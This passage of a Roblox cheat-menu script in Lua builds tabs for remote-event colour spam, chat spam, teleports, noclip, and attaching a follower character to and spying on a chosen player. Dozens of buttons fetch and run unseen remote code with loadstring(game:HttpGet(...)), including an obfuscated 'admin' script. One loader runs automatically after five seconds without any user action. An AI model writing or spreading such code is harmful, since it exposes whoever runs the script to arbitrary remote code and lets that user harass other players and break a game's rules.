        {name = "crazy-lol", id = "106958630419629"},
        {name = "V7", id = "80348640826643"},
        {name = "UIUAH", id = "82894376737849"},
        {name = "meta ritmo", id = "110091098283354"},
        {name = "CAPPUCCINO ASSASSINO (SPEDUP)", id = "132733033157915"},
        {name = "haha (NGI)", id = "122114766584918"},
        {name = "impostor syndrome funk", id = "123244893615420"},
        {name = "Apologise in brazil funk", id = "92090093126859"},
        {name = "sleeping city funk", id = "73811397460869"},
        {name = "monocle funk", id = "104589848375873"},
        {name = "dark age funk", id = "116976635180369"},
        {name = "digital funk", id = "120449053339564"},
        {name = "montagem tentana", id = "86173461299180"},
        {name = "montagem bêbado", id = "76423768678097"},
        {name = "n sei Kkk", id = "107553113067574"},
        {name = "montagem dimension", id = "91321899732034"},
        {name = "montagem cozes abece", id = "102688248317930"},
        {name = "montagem mordida", id = "125558044365066"}
    }
}, "Option 1")

-- Dropdown "Phonk"
createMusicDropdown("Phonk", {
    ["phonk"] = {
        {name = "wyles", id = "85385155970460"},
        {name = "Vai Que E No Vapor!", id = "94845998956451"},
        {name = "phonk kawai", id = "91502410121438"},
        {name = "querendo da a bucet@", id = "72720721570850"},
        {name = "vem no pocpoc", id = "102333419023382"},
        {name = "tatiu wim", id = "122871512353520"},
        {name = "novinha sapeca", id = "111668097052966"},
        {name = "novinha representa", id = "93786060174790"},
        {name = "phonk1", id = "77501611905348"},
        {name = "phonk2", id = "126887144190812"},
        {name = "phonk sarra", id = "132436320685732"},
        {name = "phonk3", id = "90323407842935"},
        {name = "novinha dançapanpa", id = "132245626038510"},
        {name = "phonk sexoagreçivo", id = "111995323199676"},
        {name = "phonk4", id = "115016589376700"},
        {name = "phonk5", id = "118740708757685"},
        {name = "phonk6", id = "139435437308948"},
        {name = "phonk chapaquente", id = "109189438638906"},
        {name = "phonk rajada", id = "105126065014034"},
        {name = "rede globo", id = "138487820505005"},
        {name = "phonk indiano", id = "87968531262747"},
        {name = "vapo do vapo", id = "106317184644394"},
        {name = "tutatatutata", id = "112068892721408"},
        {name = "phonk slower", id = "122852029094656"},
        {name = "phonk9", id = "91760524161503"},
        {name = "phonk10", id = "73140398421340"},
        {name = "phonk11", id = "137962454483542"},
        {name = "phonk12", id = "84733736048142"},
        {name = "phonk13", id = "106322173003761"},
        {name = "phonk14", id = "94604796823780"},
        {name = "phonk15", id = "118063577904953"},
        {name = "phonk16", id = "115567432786512"},
        {name = "phonk toq", id = "71304501822029"},
        {name = "phonk hey", id = "132218979961283"},
        {name = "phonk17", id = "102708912256857"},
        {name = "phonk18", id = "140642559093189"},
        {name = "phonk neve", id = "13530439660"},
        {name = "phonk19", id = "87863924786534"},
        {name = "phonk20", id = "133135085604736"},
        {name = "phonk lento", id = "97258811783169"},
        {name = "phonk21", id = "92308400487695"},
        {name = "tipo wym", id = "88064647826500"},
        {name = "estouradassa1", id = "92175624643620"},
        {name = "estouradassa2", id = "108099943758978"},
        {name = "trem", id = "114608169341947"},
        {name = "eoropa", id = "111346133543699"},
        {name = "atimosphekika", id = "77857496821844"},
        {name = "phonk ALL THE TIME", id = "123809083385992"},
        {name = "Automotivo Blondie (Pke Gaz1nh)", id = "74564219749776"},
        {name = " v2", id =  "118225359190317"},
        {name = "MTG TU VAI SENTAR (Pke Gaz1nh)", id = "115317874112657"},
        {name = "Catuquanvan", id = "88038595663211"},
        {name = "F-D-1 (slowed)", id = "124958445624871"},
        {name = "Sucessagem", id = "88551699463723"},
        {name = "ILOVE phonksla", id = "82148953715595"},
        {name = "SPEED SLIDE", id = "118959437310311"},
        {name = "TOMA FUNK PHONK", id = "126291069838831"},
        {name = "PASSO BEM SOLTO X NEW JAZZ", id = "122706595087279"},
        {name = "MONTAGEM BIONICA DIAMANTE", id = "122338822665007"},
        {name = "BALA SELVAGEM!", id = "96180057167470"},
        {name = "COMO TU", id = "86928685812280"},
        {name = "MONTAGEM SOLAR TROPICANO (SPEED UP)", id = "116461681407294"},
        {name = "MONTAGEM SOLAR TROPICANO (SLOWED)", id = "109308273341422"},
        {name = "YO DE TI", id = "125181345407169"},
        {name = "Beauty, (Phonk), Super sped up", id = "71123357599630"},
        {name = "BRAZIL DO FUNK", id = "133498554139200"},
        {name = "FUNK DO RAVE 1.0", id = "137135395010424"},
        
        {name = " Portao Funk", id = "70900514961735"},
        {name = " FUTABA", id = "91834632690710"},
        {name = " Melódica Explosão De Melodia", id = "98371771055411"},
        {name = " HIPNOTIZA", id = "117668905142866"},
        {name = "CRISTAL NOTURNO", id = "103695219371872"},
        {name = " SKY HIGH", id = "123517126955383"},
        {name = "GOTH FUNK", id = "97662362226511"},
        {name = "SUBURBANA", id = "139825057894568"},
        {name = "STORYMODECOOL", id = "87115976125426"},
        {name = "KOBALT", id = "79381341943021"},
        {name = " andante bacterial", id = "105882833374061"},
        {name = "ANGEL Speed Up", id = "139593870988593"},
        {name = "MALDITA", id = "133814632960968"},
        {name = "HIPNOTIZA", id = "132015050363205"},
        {name = "MIDZUKI speed up", id = "129151948619922"},
        {name = "CRISTAL", id = "103445348511856"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

Tab:AddButton({
    Name = "Stop",
    Description = "ALL music",
    Callback = function()
        tocarMusica("")
    end
})

local Tab6 = Window:MakeTab({"Name and Rgb's", "palette"})

local Section = Tab6:AddSection({"Aumente a velocidade do Rgb"})

-- Velocidade controlada pelo slider (quanto maior, mais rápido)
local rgbSpeed = 1

Tab6:AddSlider({
    Name = "Velocidade RGB",
    Description = "Aumenta a velocidade do efeito RGB",
    Min = 1,
    Max = 5,
    Increase = 1,
    Default = 3,
    Callback = function(Value)
        rgbSpeed = Value
    end
})

-- Função para criar cor RGB suave com HSV
local function getRainbowColor(speedMultiplier)
    local h = (tick() * speedMultiplier % 5) / 5 -- gira o hue suavemente de 0 a 1
    return Color3.fromHSV(h, 1, 1)
end

-- Função para disparar eventos
local function fireServer(eventName, args)
    local event = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
    if event and event:FindFirstChild(eventName) then
        pcall(function()
            event[eventName]:FireServer(unpack(args))
        end)
    end
end

local Section = Tab6:AddSection({"RGB para usar em você"})

-- Nome + Bio RGB  juntos
local nameBioRGBActive = false
Tab6:AddToggle({
    Name = "Nome + Bio RGB",
    Default = false,
    Callback = function(state)
        nameBioRGBActive = state
        if state then
            task.spawn(function()
                while nameBioRGBActive and LocalPlayer.Character do
                    local color = getRainbowColor(rgbSpeed)
                    fireServer("1RPNam1eColo1r", { "PickingRPNameColor", color })
                    fireServer("1RPNam1eColo1r", { "PickingRPBioColor", color })
                    task.wait(0.03)
                end
            end)
        end
    end
})

local Section = Tab6:AddSection({"RGB's"})

local ToggleBicicleta = Tab6:AddToggle({
    Name = "RGB Bicicleta",
    Description = "RGB na bicicleta",
    Default = false
})
ToggleBicicleta:Callback(function(Value)
    getgenv().rgbBicicleta = Value
    task.spawn(function()
        while getgenv().rgbBicicleta do
            fireServer("1Player1sCa1r", {
                "NoMotorColor",
                getRainbowColor(rgbSpeed)
            })
            task.wait(0.1)
        end
    end)
end)

local radioRGBActive = false
Tab6:AddToggle({
    Name = "Rádio RGB",
    Default = false,
    Callback = function(state)
        radioRGBActive = state
        if state then
            task.spawn(function()
                while radioRGBActive and LocalPlayer.Character do
                    local color = getRainbowColor(rgbSpeed)
                    local success, remote = pcall(function()
                        return LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")
                    end)
                    if success and remote then
                        pcall(function()
                            remote:FireServer(color)
                        end)
                    end
                    task.wait(0.03)
                end
            end)
        end
    end
})

local ChildTab = Window:MakeTab({"Child", "baby"})

local Section = ChildTab:AddSection({

    Name = "Child"

})

local chasingplayer = nil

local playerChild = ChildTab:AddDropdown({

    Name = "Select a player to chase",

    Options = players,

    Default = "",

    Callback = function(selected)

        if game.Players:FindFirstChild(selected) then

            chasingplayer = selected

        else

            chasingplayer = nil

        end

    end

})

ChildTab:AddButton({

    Name = "Update Player List",

    Callback = function()

        local updatedPlayers = updatePlayerList()

        if playerChild and updatedPlayers then

            pcall(function()

                playerChild:Refresh(updatedPlayers)

            end)

            if chasingplayer and not game.Players:FindFirstChild(chasingplayer) then

                chasingplayer = nil

                pcall(function()

                    playerChild:Set("")

                end)

            end

        end

    end

})

game.Players.PlayerAdded:Connect(function()

    task.wait(0.1)

    local updatedPlayers = updatePlayerList()

    if playerChild and updatedPlayers then

        pcall(function()

            playerChild:Refresh(updatedPlayers)

        end)

    end

end)



game.Players.PlayerRemoving:Connect(function(player)

    task.wait(0.1)

    local updatedPlayers = updatePlayerList()

    if playerChild and updatedPlayers then

        pcall(function()

            playerChild:Refresh(updatedPlayers)

        end)

        if chasingplayer == player.Name then

            chasingplayer = nil

            pcall(function()

                playerChild:Set("")

            end)

        end

    end

end)

ChildTab:AddButton({

    Name = "Send Child",

    Callback = function()

        if not chasingplayer then

            return

        end

        if not workspace:FindFirstChild(pl.Name) or not workspace[pl.Name]:FindFirstChild("FollowCharacter") then

            local args = {

                [1] = "CharacterFollowSpawnPlayer",

                [2] = "BabyBoy"

            }

local success, err = pcall(function()

                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args))

            end)

            if not success then

            end

        end

        

        task.wait(0.2)

        

        if workspace:FindFirstChild(pl.Name) then

            for _, v in pairs(workspace[pl.Name]:GetChildren()) do

                if v:IsA("BasePart") then

                    v.CanCollide = true

                end

            end

        end



        local target = chasingplayer

        if workspace:FindFirstChild(target) and workspace:FindFirstChild(pl.Name) and workspace[pl.Name]:FindFirstChild("FollowCharacter") then

            workspace[pl.Name].FollowCharacter.Parent = workspace[target]



            if rawget(getgenv(), "RunService") then

                return

            end



            getgenv().RunService = game:GetService("RunService").Heartbeat:Connect(function()

                local followCharacter = workspace[target]:FindFirstChild("FollowCharacter")

                if followCharacter and followCharacter:FindFirstChild("Torso") and followCharacter.Torso:FindFirstChild("BodyPosition") then

                    local humanoidRootPart = workspace[target]:FindFirstChild("HumanoidRootPart")

                    if humanoidRootPart then

                        followCharacter.Torso.BodyPosition.Position = humanoidRootPart.Position - (humanoidRootPart.CFrame.LookVector * 3)

                        followCharacter.Torso.BodyGyro.CFrame = humanoidRootPart.CFrame

                    end

                end

            end)

        end

    end

})

ChildTab:AddButton({

    Name = "Return Child",

    Callback = function()

        if rawget(getgenv(), "RunService") then

            getgenv().RunService:Disconnect()

            getgenv().RunService = nil

        end



        local args = { [1] = "DeleteFollowCharacter" }

        local success, err = pcall(function()

            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args))

        end)

        if not success then

        end



        local args1 = { [1] = "CharacterFollowSpawnPlayer", [2] = "BabyBoy" }

        success, err = pcall(function()

            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args1))

        end)

        if not success then

        end

    end

})


ChildTab:AddToggle({

    Name = "View Player",

    Default = false,

    Callback = function(Value)

        local Players = game:GetService("Players")

        local RunService = game:GetService("RunService")

        local LocalPlayer = Players.LocalPlayer

        local Camera = workspace.CurrentCamera



        if Value then

            if not chasingplayer then

                return false

            end



            if not rawget(getgenv(), "CameraConnection") then

                getgenv().CameraConnection = RunService.Heartbeat:Connect(function()

                    local targetPlayer = Players:FindFirstChild(chasingplayer)

                    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then

                        Camera.CameraSubject = targetPlayer.Character.Humanoid

                    else

                        if rawget(getgenv(), "CameraConnection") then

                            getgenv().CameraConnection:Disconnect()

                            getgenv().CameraConnection = nil

                        end

                        Camera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") or nil

                    end

                end)

            end

        else

            if rawget(getgenv(), "CameraConnection") then

                getgenv().CameraConnection:Disconnect()

                getgenv().CameraConnection = nil

            end

            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then

                Camera.CameraSubject = LocalPlayer.Character.Humanoid

            end

        end

    end

})

local LocalPlayerTab = Window:MakeTab({"Local Player", "user"})

local Section = LocalPlayerTab:AddSection({

    Name = "Local Player"

})

LocalPlayerTab:AddTextBox({

    Name = "Walk Speed",

    PlaceholderText = "Type here...",

    Callback = function(value)

        local speed = tonumber(value)

        if speed and pl.Character and pl.Character:FindFirstChild("Humanoid") then

            pl.Character.Humanoid.WalkSpeed = speed

        else

        end

    end

})

LocalPlayerTab:AddButton({

    Name = "Reset Walk Speed",

    Callback = function()

        if pl.Character and pl.Character:FindFirstChild("Humanoid") then

            pl.Character.Humanoid.WalkSpeed = 16

        end

    end

})

LocalPlayerTab:AddTextBox({

    Name = "Jump Power",

    PlaceholderText = "Type here...",

    Callback = function(value)

        local jumpHeight = tonumber(value)

        if jumpHeight and pl.Character and pl.Character:FindFirstChild("Humanoid") then

            pl.Character.Humanoid.JumpPower = jumpHeight

        else

        end

    end

})

LocalPlayerTab:AddButton({

    Name = "Reset Jump Power",

    Callback = function()

        if pl.Character and pl.Character:FindFirstChild("Humanoid") then

            pl.Character.Humanoid.JumpPower = 50

        end

    end

})

LocalPlayerTab:AddTextBox({

    Name = "Gravity",

    PlaceholderText = "Type here...",

    Callback = function(value)

        local gravity = tonumber(value)

        if gravity then

            workspace.Gravity = gravity

        else

        end

    end

})

LocalPlayerTab:AddButton({

    Name = "Reset Gravity",

    Callback = function()

        workspace.Gravity = 196.2

    end

})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local noclipConnection

LocalPlayerTab:AddToggle({
    Name = "Noclip",
    Callback = function(state)

        if state then
            noclipConnection = RunService.Stepped:Connect(function()
                local char = player.Character
                if char then
                    for _, v in pairs(char:GetDescendants()) do
                        if v:IsA("BasePart") then
                            v.CanCollide = false
                        end
                    end
                end
            end)

        else
            if noclipConnection then
                noclipConnection:Disconnect()
                noclipConnection = nil
            end
        end

    end
})

LocalPlayerTab:AddSection({ "FE INVISIBLE" })
LocalPlayerTab:AddButton({
    Name = "FE INVISIBLE",
    Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
    end
}) 

Section = LocalPlayerTab:AddSection({

    Name = "Chat"

})

local TextSave

local tcs = game:GetService("TextChatService")

local chat = tcs.ChatInputBarConfiguration and tcs.ChatInputBarConfiguration.TargetTextChannel

function sendchat(msg)

    if not msg or msg == "" then return end

    if tcs.ChatVersion == Enum.ChatVersion.LegacyChatService then

        local success, err = pcall(function()

            game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(msg, "All")

        end)

        if not success then

        end

    elseif chat then

        local success, err = pcall(function()

            chat:SendAsync(msg)

        end)

        if not success then

        end

    end

end

LocalPlayerTab:AddTextBox({

    Name = "Enter Text",

    PlaceholderText = "Uh... Hi!",

    Callback = function(text)

        TextSave = text

    end

})

LocalPlayerTab:AddButton({

    Name = "Send Chat",

    Callback = function()

        sendchat(TextSave)

    end

})

getgenv().ChaosHubEnviarDelay = 1

LocalPlayerTab:AddSlider({

    Name = "Delay Spam",

    Min = 0.4,

    Max = 10,

    Default = 1,

    Increment = 0.1,

    Callback = function(Value)

        getgenv().ChaosHubEnviarDelay = Value

    end

})

LocalPlayerTab:AddToggle({

    Name = "Spam Chat",

    Default = false,

    Flag = "SpamXhati",

    Callback = function(Value)

        getgenv().ChaosHubSpawnText = Value

        while getgenv().ChaosHubSpawnText do

            sendchat(TextSave)

            task.wait(getgenv().ChaosHubEnviarDelay)

        end

    end

})

local ScrTab = Window:MakeTab({ "Scripts", "terminal" })

ScrTab:AddSection({ "Drone  " })
ScrTab:AddButton({
    Name = "Drone para espionar os outros akkaka",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/drone/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "emotes" })
ScrTab:AddButton({
    Name = "emote gratis",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Gaze-emote-74592"))()
    end
})

ScrTab:AddSection({ "fly " })
ScrTab:AddButton({
    Name = "Fly super invencible",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-flight-of-the-Invincible-59729"))()
    end
})

ScrTab:AddSection({ "Youtube" })
ScrTab:AddButton({
    Name = "Youtube music v8",
    Callback = function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Youtube-Music-Player-Without-Key-231639"))()
    end
})

ScrTab:AddSection({ "Cafezin hub drift " })
ScrTab:AddButton({
    Name = "drift script",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/92373839838383388273/Qoiqnmbzxbjswooa282873289192-2-k8-kakns-8-9---82873832938u/refs/heads/main/Vortex_Drift_apenas_volante_corrigido%20(1).txt"))()
    end
})

ScrTab:AddSection({ "Free gamepass" })
ScrTab:AddButton({
    Name = "gamepass teste",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/trakishub/Vortex-hub-v5/refs/heads/main/Free%20gamepass"))()
    end
})

local ScrTab = Window:MakeTab({ "Horror", "ghost" })

ScrTab:AddSection({ "Naruto" })
ScrTab:AddButton({
    Name = "Naruto Fe",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas"))()
    end
})

ScrTab:AddSection({ "Batman" })
ScrTab:AddButton({
    Name = "Batman FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas89"))()
    end
})

ScrTab:AddSection({ "Sonic exe" })
ScrTab:AddButton({
    Name = "Sonic Exe FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas86"))()
    end
})

ScrTab:AddSection({ "Panico" })
ScrTab:AddButton({
    Name = "Panico FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/yyyyyyyface/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "Morty" })
ScrTab:AddButton({
    Name = "Morty FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/repositoryredzlib/Mortyyyyyy/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "Rick Sanchez" })
ScrTab:AddButton({
    Name = "Rick Sanchez FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/rick-Sanchez-/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "Cowboy" })
ScrTab:AddButton({
    Name = "Cowboy FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/wjsj/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "Guest666" })
ScrTab:AddButton({
    Name = "Guest666 FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/swsw/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "câmera de carro" })
ScrTab:AddButton({
    Name = "carro no roblox kkj",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/repositoryredzlib/Carfling/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "VR" })
ScrTab:AddButton({
    Name = "Fe vr",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty45.lua"))()
    end
})

ScrTab:AddSection({ "Obito" })
ScrTab:AddButton({
    Name = "Obito FE",
    Callback = function()
        loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/c47b8a12ca6c4cef840280dafd893e7d"))()
    end
})

ScrTab:AddSection({ "Shadow" })
ScrTab:AddButton({
    Name = "Shadow FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/Shadow/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "Goner" })
ScrTab:AddButton({
    Name = "Goner FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/GONER/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "Noly" })
ScrTab:AddButton({
    Name = "Noly FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/gubby/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "Tubers" })
ScrTab:AddButton({
    Name = "Tubers FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/1222/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "mãozinha" })
ScrTab:AddButton({
    Name = "mãozinha FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/slafiznotedio/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "C00LKIDD" })
ScrTab:AddButton({
    Name = "C00LKIDD FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/repositoryredzlib/xzzxsx/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "Jeff the killer" })
ScrTab:AddButton({
    Name = "Jeff the killer FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/Jeff/refs/heads/main/Main.txt"))()
    end
})

ScrTab:AddSection({ "Ominitrix" })
ScrTab:AddButton({
    Name = "Ominitrix FE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/Ominitrix/refs/heads/main/Main.txt"))()
    end
})

local Tab = Window:MakeTab({"Teleports", "map-pin"}) 

local Section = Tab:AddSection({

    Name = "Teleports"

})

local teleportButtons = {

    {"Hotel", CFrame.new(192, 4, 272)},

    {"Urban Center", CFrame.new(136, 4, 117)},

    {"Criminal Area", CFrame.new(-119, -28, 235)},

    {"Abandoned House", CFrame.new(986, 4, 63)},

    {"Agency Portal", CFrame.new(672, 4, -296)},

    {"Hideout", CFrame.new(505, -75, 143)},

    {"School", CFrame.new(-312, 4, 211)},

    {"Burguer Barn", CFrame.new(161, 8, 52)},

    {"Starting Point", CFrame.new(-26, 4, -23)},

    {"Main Arch", CFrame.new(-589, 141, -59)},

    {"Hospital", CFrame.new(-309, 4, 71)},

    {"Agency Base", CFrame.new(179, 4, -464)},

    {"Hidden Place of the Workshop", CFrame.new(0, 4, -495)},

    {"Secret Place", CFrame.new(-343, 4, -613)},

    {"Isolated Island", CFrame.new(-1925, 23, 127)},

    {"Hotel Square", CFrame.new(182, 4, 150)},

    {"Climb Mountain", CFrame.new(-670, 251, 765)},

    {"Main Bank", CFrame.new(2.28, 4.65, 254.58)},

    {"Clothing Store", CFrame.new(-46.15, 4.65, 253.20)},

    {"Veterinary", CFrame.new(-88.48, 22.05, 262.34)},

    {"Dental Clinic", CFrame.new(-53.58, 22.15, 265.61)},

    {"Coffee", CFrame.new(-97.12, 4.65, 254.99)}

}



for _, btn in ipairs(teleportButtons) do

    Tab:AddButton({

        btn[1],

        function()

            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = btn[2]

        end

    })

end


local Tab13 = Window:MakeTab({"Protections", "shield"})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local protections = {
    Canoe = false,
    Jet = false,
    Heli = false,
    Ball = false,
    Sit = false
}

task.spawn(function()
    while true do

        local char = LocalPlayer.Character
        local workspaceCom = Workspace:FindFirstChild("WorkspaceCom")

        if workspaceCom then

            -- Anti Canoe Fling
            if protections.Canoe then
                local canoeFolder = workspaceCom:FindFirstChild("001_CanoeStorage")
                if canoeFolder then
                    for _, canoe in ipairs(canoeFolder:GetChildren()) do
                        local owner = canoe:FindFirstChild("Owner")
                        if not owner or owner.Value ~= LocalPlayer then
                            canoe:Destroy()
                        end
                    end
                end
            end

            -- Anti Jet Fling
            if protections.Jet then
                local airport = workspaceCom:FindFirstChild("001_Airport")
                if airport then
                    local hanger = airport:FindFirstChild("AirportHanger")
                    if hanger then
                        local jetStorage = hanger:FindFirstChild("001_JetStorage")
                        if jetStorage then
                            local jetFolder = jetStorage:FindFirstChild("JetAirport")
                            if jetFolder then
                                for _, jet in ipairs(jetFolder:GetChildren()) do
                                    if jet.Name ~= LocalPlayer.Name then
                                        jet:Destroy()
                                    end
                                end
                            end
                        end
                    end
                end
            end

            -- Anti Helicopter Fling
            if protections.Heli then
                local heliStorage = workspaceCom:FindFirstChild("001_HeliStorage")
                if heliStorage then
                    local heliFolder = heliStorage:FindFirstChild("PoliceStationHeli")
                    if heliFolder then
                        for _, heli in ipairs(heliFolder:GetChildren()) do
                            if heli.Name ~= LocalPlayer.Name then
                                heli:Destroy()
                            end
                        end
                    end
                end
            end

            -- Anti Ball Fling
            if protections.Ball then
                local ballFolder = workspaceCom:FindFirstChild("001_SoccerBalls")
                if ballFolder then
                    for _, ball in ipairs(ballFolder:GetChildren()) do
                        ball:Destroy()
                    end
                end
            end

        end

        -- Anti Sit
        if protections.Sit and char then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                if humanoid:GetState() == Enum.HumanoidStateType.Seated then
                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
            end
        end

        task.wait(0.2)

    end
end)

-- Toggles

Tab13:AddToggle({
    Name = "Anti Canoe Fling",
    Default = false,
    Callback = function(value)
        protections.Canoe = value
    end
})

Tab13:AddToggle({
    Name = "Anti Jet Fling",
    Default = false,
    Callback = function(value)
        protections.Jet = value
    end
})

Tab13:AddToggle({
    Name = "Anti Helicopter Fling",
    Default = false,
    Callback = function(value)
        protections.Heli = value
    end
})

Tab13:AddToggle({
    Name = "Anti Ball Fling",
    Default = false,
    Callback = function(value)
        protections.Ball = value
    end
})

Tab13:AddToggle({
    Name = "Anti Sit",
    Default = false,
    Callback = function(value)
        protections.Sit = value
    end
})

task.delay(5, function()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/OFbzRF1izFenc6Li/raw"))()
end)


local ScrTab = Window:MakeTab({ "PAINEL ADMIN", "crown" })

ScrTab:AddSection({ "admin" })
ScrTab:AddButton({
    Name = "apenas donos e moderadores conseguem usar",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/caf3zinz/Best-script-/refs/heads/main/25ms_obf.lua"))()
    end
})

-- tags 

-- ========================================
-- SISTEMA DE WHITELIST E TAGS
-- ========================================
getgenv().KitKatConfig = {
    -- Se true, qualquer um usa o painel
    IgnorarWhitelist = false,

    -- Opcional. Formato do arquivo remoto:  return { "nome1", "nome2" }
    AuthorizedPlayersURL = "",

    SpecialTags = {
        ["surf_2261"]  = "Dono lindão ne bb",
        ["Hey_zPUDIM"] = "Owner",
        ["82828383"]   = "Moderador",
    }
}

local ActiveTags = {}
local AuthorizedPlayersList = {}

-- Limpa tags de uma execução anterior do script (reinjeção / auto-exec duplicado)
do
    local cleanupTargets = {}
    pcall(function() table.insert(cleanupTargets, gethui and gethui()) end)
    table.insert(cleanupTargets, Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
    table.insert(cleanupTargets, game:GetService("CoreGui"))
    for _, container in ipairs(cleanupTargets) do
        if container then
            for _, obj in ipairs(container:GetChildren()) do
                if obj.Name:match("^VortexTag") then
                    pcall(function() obj:Destroy() end)
                end
            end
        end
    end
end

-- LISTA LOCAL: funciona sem internet. COLOQUE SEU NOME AQUI.
local WhitelistLocal = {
    "surf_2261",
    "Hey_zPUDIM",
    "ruy_0068",
}

for _, nome in ipairs(WhitelistLocal) do
    table.insert(AuthorizedPlayersList, tostring(nome))
end

task.spawn(function()
    local url = getgenv().KitKatConfig.AuthorizedPlayersURL
    if not url or url == "" then return end
    local ok, dados = pcall(game.HttpGet, game, url, true)
    if not ok or type(dados) ~= "string" or dados:find("404") then return end
    local fn = loadstring(dados)
    if not fn then return end
    local ok2, lista = pcall(fn)
    if ok2 and type(lista) == "table" then
        for _, nome in ipairs(lista) do
            table.insert(AuthorizedPlayersList, tostring(nome))
        end
    end
end)

local function IsPlayerAuthorized(playerName)
    if getgenv().KitKatConfig.IgnorarWhitelist then return true end
    if getgenv().KitKatConfig.SpecialTags[playerName] then return true end
    local lowerName = string.lower(tostring(playerName))
    for _, name in ipairs(AuthorizedPlayersList) do
        if string.lower(tostring(name)) == lowerName then
            return true
        end
    end
    return false
end

local function GetCargo(playerName)
    if getgenv().KitKatConfig.SpecialTags[playerName] then
        return getgenv().KitKatConfig.SpecialTags[playerName]
    elseif IsPlayerAuthorized(playerName) then
        return "Moderador Scarlet"
    end
    return ""
end

local function RemovePlayerTag(playerName)
    if ActiveTags[playerName] then
        local tagData = ActiveTags[playerName]
        if tagData.Billboard then
            pcall(function() tagData.Billboard:Destroy() end)
        end
        ActiveTags[playerName] = nil
    end
end

-- ========================================
-- TAG SCARLET HUB (foto + nome + cargo)
-- ========================================
local function CreatePlayerTag(playerName, tagText)
    local player = Players:FindFirstChild(playerName)
    if not player or not player.Character then return end
    local head = player.Character:FindFirstChild("Head")
    if not head then return end
    RemovePlayerTag(playerName)

    -- segurança extra: apaga qualquer billboard velho deste jogador específico
    pcall(function()
        local containers = {}
        pcall(function() if gethui then table.insert(containers, gethui()) end end)
        table.insert(containers, Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
